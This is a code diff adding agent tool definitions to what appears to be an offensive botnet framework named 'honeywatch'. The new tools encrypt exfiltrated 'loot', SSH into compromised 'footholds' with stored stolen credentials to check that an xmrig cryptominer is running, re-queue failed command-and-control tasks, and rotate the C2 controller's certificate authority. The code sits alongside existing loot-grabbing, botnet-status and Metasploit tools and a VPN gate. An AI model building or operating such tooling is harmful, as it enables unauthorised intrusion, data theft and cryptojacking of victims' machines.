@@ -421,6 +421,7 @@ _TOOL_SPECS: list[dict[str, Any]] = [
                 "pass": {"type": "string"},
                 "key": {"type": "string"},
                 "stash": {"type": "string", "description": "local stash dir (default .honeywatch/loot_stash)."},
+                "encrypt": {"type": "boolean", "description": "encrypt exfiltrated files at rest with vault_passphrase (default false)."},
                 "skip_vpn_check": {"type": "boolean"},
             },
             "required": ["host"],
@@ -638,6 +639,44 @@ _TOOL_SPECS: list[dict[str, Any]] = [
                 "skip_vpn_check": {"type": "boolean"},
             },
             "required": ["host"],
+        },
+    },
+    {
+        "name": "verify_deploy",
+        "description": "Verify that a deployed miner is actually running on a foothold. SSHes into the host and checks for the xmrig process. Returns running/not_running status per host.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "host": {"type": "string", "description": "ip[:port] of the foothold to verify."},
+                "user": {"type": "string", "description": "SSH username (defaults to stored credential)."},
+                "pass": {"type": "string", "description": "SSH password (defaults to stored credential)."},
+                "key": {"type": "string", "description": "SSH private key path."},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["host"],
+        },
+    },
+    {
+        "name": "retry_task",
+        "description": "Re-queue a failed C2 task for retry. Resets the task status from 'failed' to 'pending' so another worker can claim it. Only works if retry_count < max_retries (default 3).",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "task_id": {"type": "string", "description": "ID of the failed task to retry."},
+            },
+            "required": ["task_id"],
+        },
+    },
+    {
+        "name": "ca_rotate",
+        "description": "Check or trigger CA certificate rotation on the C2 controller. When active, workers can fetch the new CA from /api/ca-rotate and add it to their trust store.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "action": {"type": "string", "description": "check or trigger. 'check' returns current rotation status; 'trigger' generates a new CA cross-signed by the old one.", "enum": ["check", "trigger"]},
+                "transition_hours": {"type": "integer", "description": "Hours for the rotation transition window (default 24). Only used with action=trigger."},
+            },
+            "required": ["action"],
         },
     },
 ]
@@ -1075,10 +1114,16 @@ def _tool_grab_loot(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
         if cred:
             user = user or cred.get("user")
             passw = passw or cred.get("password")
+    # Encrypt loot at rest if requested and vault passphrase is available.
+    vault_key = None
+    if args.get("encrypt") and ctx.config.get("storage", {}).get("vault_passphrase"):
+        from honeywatch.c2.crypto import derive_vault_key
+        vault_key = derive_vault_key(ctx.config["storage"]["vault_passphrase"])
     res = grab_loot(
         ip=ip, port=port, user=user, password=passw, key_path=args.get("key"),
         stash_dir=args.get("stash", ".honeywatch/loot_stash"),
         timeout_s=10.0,
+        vault_key=vault_key,
     )
     return {
         "ip": res.ip, "port": res.port,
@@ -1754,6 +1799,85 @@ def _tool_metasploit(args, ctx):
             pass
 
 
+def _tool_verify_deploy(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked verification. Connect Mullvad or pass skip_vpn_check=true."}
+
+    from honeywatch.cli import parse_host
+    from honeywatch.chain import _ssh_exec
+
+    ip, port = parse_host(args["host"])
+    user = args.get("user")
+    passw = args.get("pass")
+    if (not user or not passw) and not args.get("key"):
+        cred = ctx.store.credential_for(ip, port)
+        if cred:
+            user = user or cred.get("user")
+            passw = passw or cred.get("password")
+    key_path = args.get("key")
+    rc, out, err = _ssh_exec(ip, port, user, passw, key_path,
+                              "pgrep -x xmrig >/dev/null 2>&1 && echo RUNNING || echo NOT_RUNNING",
+                              10.0)
+    status = "running" if "RUNNING" in (out or "") else "not_running"
+    return {"ip": ip, "port": port, "miner_status": status, "returncode": rc, "output": (out or "")[:500]}
+
+
+def _tool_retry_task(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    task_id = args.get("task_id", "")
+    if not task_id:
+        return {"error": "task_id is required"}
+    from honeywatch.c2 import C2Store
+    store = C2Store(ctx.config.get("c2", {}).get("db", "honeywatch.db"))
+    task = store.query_tasks(task_id=task_id)
+    if not task:
+        return {"error": f"task {task_id} not found"}
+    task = task[0]
+    if task.status != "failed":
+        return {"error": f"task {task_id} is not failed (status={task.status})"}
+    retried = store.fail_task_with_retry(task_id, task.worker_id or "", {"retried_by": "agent"})
+    if retried:
+        return {"task_id": task_id, "status": "re_queued", "retry_count": task.retry_count + 1}
+    else:
+        return {"task_id": task_id, "status": "permanently_failed", "retry_count": task.retry_count}
+
+
+def _tool_ca_rotate(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    action = args.get("action", "check")
+    c2_cfg = ctx.config.get("c2", {})
+    ca_path = c2_cfg.get("ca_path") or c2_cfg.get("ca")
+    if not ca_path:
+        return {"error": "No CA path configured. Set c2.ca_path or pass --ca."}
+    if action == "check":
+        import os
+        new_ca = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca-new.pem")
+        cross = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "ca-cross.pem")
+        rotation_active = os.path.isfile(new_ca) and os.path.isfile(cross)
+        return {"rotation_active": rotation_active, "ca_path": ca_path, "new_ca_exists": os.path.isfile(new_ca)}
+    elif action == "trigger":
+        import os
+        from honeywatch.c2.ca import rotate_ca
+        old_ca_key = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca.key")
+        new_ca_cert = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca-new.pem")
+        new_ca_key = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca-new.key")
+        if not os.path.isfile(old_ca_key):
+            return {"error": f"CA key not found at {old_ca_key}"}
+        transition_hours = args.get("transition_hours", 24)
+        try:
+            result = rotate_ca(ca_path, old_ca_key, new_ca_cert, new_ca_key)
+        except Exception as exc:
+            return {"error": f"CA rotation failed: {exc}"}
+        return {
+            "new_ca_cert": result["new_ca_cert"],
+            "cross_cert": result["cross_cert"],
+            "new_pin": result["new_pin"],
+            "old_pin": result["old_pin"],
+            "transition_hours": transition_hours,
+        }
+    else:
+        return {"error": f"unknown action {action!r}; use 'check' or 'trigger'"}
+
+
 # Register tools.
 _tool("list_payloads", _tool_list_payloads)
 _tool("get_status", _tool_get_status)
@@ -1785,6 +1909,9 @@ _tool("credential_for", _tool_credential_for)
 _tool("test_credential", _tool_test_credential)
 _tool("botnet_status", _tool_botnet_status)
 _tool("metasploit", _tool_metasploit)
+_tool("verify_deploy", _tool_verify_deploy)
+_tool("retry_task", _tool_retry_task)
+_tool("ca_rotate", _tool_ca_rotate)
 
 
 def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
